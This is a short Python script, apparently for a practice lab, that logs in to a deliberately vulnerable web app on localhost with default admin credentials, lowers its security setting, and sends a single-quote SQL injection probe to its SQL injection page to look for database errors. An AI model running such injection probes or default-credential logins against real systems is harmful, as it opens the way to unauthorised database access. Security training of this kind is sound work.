import requests

session = requests.Session()
login_data = {'username': 'admin', 'password': 'password', 'Login': 'Login'}
session.post("http://localhost/login.php", data=login_data)

security_data = {'security': 'low', 'submit': 'Submit'}
session.post("http://localhost/security.php", data=security_data)

url = "http://localhost/vulnerabilities/sqli/"

# Test 1: Normal request
print("TEST 1: Normal (id=1)")
r1 = session.get(url, params={"id": "1", "Submit": "Submit"})
print(f"Status: {r1.status_code}, Length: {len(r1.text)}")
print(r1.text[1000:1500] if len(r1.text) > 1000 else r1.text[:500])
print()

# Test 2: SQL Injection - check for error
print("TEST 2: SQL Injection with single quote")
r2 = session.get(url, params={"id": "'", "Submit": "Submit"})
print(f"Status: {r2.status_code}, Length: {len(r2.text)}")
if "error" in r2.text.lower() or "syntax" in r2.text.lower():
    print("FOUND ERROR MESSAGE!")
print(r2.text[1000:1500] if len(r2.text) > 1000 else r2.text[:500])
